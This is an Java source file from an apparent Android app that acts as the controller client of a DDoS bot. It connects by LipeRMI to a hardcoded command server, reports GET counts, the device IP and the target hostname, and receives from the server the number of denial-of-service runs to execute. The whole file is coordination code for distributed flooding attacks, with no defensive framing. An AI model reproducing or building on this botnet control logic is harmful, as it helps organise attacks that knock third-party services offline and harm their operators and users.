package com.example.senura.lipermitest1;

import net.sf.lipermi.handler.CallHandler;
import net.sf.lipermi.net.Client;

import java.io.IOException;

/**
 * Created by senura on 4/15/18.
 */

public class ClientControllerCon {




    private static TestServiceController remoteObject=null;

    private static int myGETCount=0;
    private static String myIP="";
    private static String hostName="";


    public static boolean start(){
        return setClient();
    }


    private static boolean setClient(){

        boolean isServerCameOnline=false;

        CallHandler callHandler = new CallHandler();
        String remoteHost = "172.20.8.65";//"192.168.1.4";
        int portWasBinded = 58883;

        Client client=null;

        try {
            client = new Client(remoteHost, portWasBinded, callHandler);
            isServerCameOnline=true;
        } catch (IOException ex) {
            MainActivity.setStatusText("Controller is not online");
        }


        if(client!=null){
            remoteObject =
                    (TestServiceController) client.getGlobal(TestServiceController.class);

            MainActivity.setStatusText(remoteObject.getResponse("hi"));

            if(myGETCount!=0 && !myIP.equals("") && !hostName.equals(""))
                remoteObject.setDDOSCount(myGETCount,myIP,hostName);






        }
        return isServerCameOnline;
    }



    public static int takeNumOfDDOSToBeExcecuted(){
        int ddosNos=0;

        if(remoteObject.isProposedDDOSCountSet()){
            ddosNos=remoteObject.getNumofDDOSToBeExcecuted(myIP);

            MainActivity.setStatusText(" takeNumOfDDOSToBeExcecuted returned = "+ddosNos);


            if(myGETCount>ddosNos)
                System.out.println("Provided ddos count is lower, thus");

        }

        return ddosNos;
    }




    public static void sendGetLoopFinishedToControlServer(int getCount, String IPAddress, String hostName){
        remoteObject.sendGetDone(getCount, IPAddress, hostName);
    }



    public static void setControllerVar(int count, String ip, String HName){
        myGETCount=count;
        myIP=ip;
        hostName=HName;
    }




}
